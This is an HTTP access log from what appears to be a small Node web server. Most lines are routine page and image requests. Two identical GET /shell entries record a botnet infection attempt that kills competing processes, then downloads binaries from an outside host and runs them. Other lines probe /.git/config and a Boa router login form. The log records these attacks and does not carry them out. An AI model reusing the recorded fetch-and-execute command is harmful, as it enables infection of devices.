Server is running on port:  \\.\pipe\35645722-f7a2-4299-b2e3-710384c85b4b
[0mGET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws [33m404[0m 2.854 ms - 144[0m
[0mGET / [32m200[0m 12.751 ms - 31962[0m
[0mGET / [32m200[0m 12.059 ms - 31962[0m
[0mGET / [32m200[0m 12.657 ms - 31962[0m
[0mGET / [32m200[0m 14.077 ms - 31962[0m
[0mGET / [32m200[0m 12.452 ms - 31962[0m
[0mGET / [32m200[0m 10.794 ms - 31962[0m
[0mGET / [32m200[0m 12.739 ms - 31962[0m
[0mGET / [32m200[0m 12.338 ms - 31962[0m
[0mGET / [32m200[0m 11.938 ms - 31962[0m
[0mGET / [32m200[0m 10.968 ms - 31962[0m
[0mGET / [32m200[0m 11.840 ms - 31962[0m
[0mGET / [32m200[0m 11.673 ms - 31962[0m
[0mGET / [32m200[0m 10.531 ms - 31962[0m
[0mGET /assets/img/img_1.png [32m200[0m 4.061 ms - 4486[0m
[0mGET / [32m200[0m 10.399 ms - 31962[0m
[0mGET / [32m200[0m 12.214 ms - 31962[0m
[0mGET / [32m200[0m 12.009 ms - 31962[0m
[0mGET / [32m200[0m 10.596 ms - 31962[0m
[0mGET / [32m200[0m 12.069 ms - 31962[0m
[0mGET / [32m200[0m 12.212 ms - 31962[0m
[0mGET / [32m200[0m 10.713 ms - 31962[0m
[0mGET / [32m200[0m 10.895 ms - 31962[0m
[0mGET /.git/config [33m404[0m 2.849 ms - 150[0m
[0mGET / [32m200[0m 12.335 ms - 31962[0m
[0mGET / [32m200[0m 11.783 ms - 31962[0m
[0mGET / [32m200[0m 9.951 ms - 31962[0m
[0mGET / [32m200[0m 10.417 ms - 31962[0m
[0mGET / [32m200[0m 12.522 ms - 31962[0m
[0mGET / [32m200[0m 12.118 ms - 31962[0m
[0mGET / [32m200[0m 10.578 ms - 31962[0m
[0mGET / [32m200[0m 11.909 ms - 31962[0m
[0mGET / [32m200[0m 12.621 ms - 31962[0m
[0mGET / [32m200[0m 10.727 ms - 31962[0m
[0mGET / [32m200[0m 11.020 ms - 31962[0m
[0mGET / [32m200[0m 12.348 ms - 31962[0m
[0mGET / [32m200[0m 11.817 ms - 31962[0m
[0mGET / [32m200[0m 10.539 ms - 31962[0m
[0mGET / [32m200[0m 11.418 ms - 31962[0m
[0mGET / [32m200[0m 11.742 ms - 31962[0m
[0mGET / [32m200[0m 10.585 ms - 31962[0m
[0mGET / [32m200[0m 10.538 ms - 31962[0m
[0mGET / [32m200[0m 12.139 ms - 31962[0m
[0mGET / [32m200[0m 12.101 ms - 31962[0m
[0mGET / [32m200[0m 10.610 ms - 31962[0m
[0mGET / [32m200[0m 12.111 ms - 31962[0m
[0mGET / [32m200[0m 12.347 ms - 31962[0m
[0mPOST /boaform/admin/formLogin [33m404[0m 4.046 ms - 163[0m
[0mGET / [32m200[0m 10.522 ms - 31962[0m
[0mGET / [32m200[0m 10.580 ms - 31962[0m
[0mPOST /boaform/admin/formLogin [33m404[0m 3.232 ms - 163[0m
[0mGET / [32m200[0m 10.575 ms - 31962[0m
[0mGET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws [33m404[0m 2.886 ms - 144[0m
[0mGET / [32m200[0m 12.021 ms - 31962[0m
[0mGET / [32m200[0m 12.271 ms - 31962[0m
[0mGET / [32m200[0m 11.904 ms - 31962[0m
[0mGET / [32m200[0m 10.537 ms - 31962[0m
[0mGET / [32m200[0m 12.874 ms - 31962[0m
[0mGET / [32m200[0m 12.478 ms - 31962[0m
[0mGET / [32m200[0m 11.626 ms - 31962[0m
[0mGET / [32m200[0m 10.546 ms - 31962[0m
[0mGET / [32m200[0m 12.011 ms - 31962[0m
